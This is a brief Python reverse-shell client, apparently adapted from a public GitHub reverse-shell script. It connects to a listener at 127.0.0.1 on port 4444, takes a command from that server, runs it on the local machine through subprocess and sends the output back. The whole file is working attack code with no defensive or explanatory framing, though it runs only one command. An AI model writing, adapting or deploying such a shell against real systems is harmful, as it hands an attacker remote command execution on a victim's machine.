# author: sfoffo
# adapting: https://raw.githubusercontent.com/Fa1c0n35/Script_Reverse-Shell/master/client.py

import socket
import subprocess
import sys

SERVER_HOST = "127.0.0.1"
SERVER_PORT = 4444
BUFFER_SIZE = 1024

# create the socket object
s = socket.socket()
# connect to the server
s.connect((SERVER_HOST, SERVER_PORT))

# receive the command from the server
command = s.recv(BUFFER_SIZE).decode()
output = subprocess.getoutput(command)
s.send(output.encode())
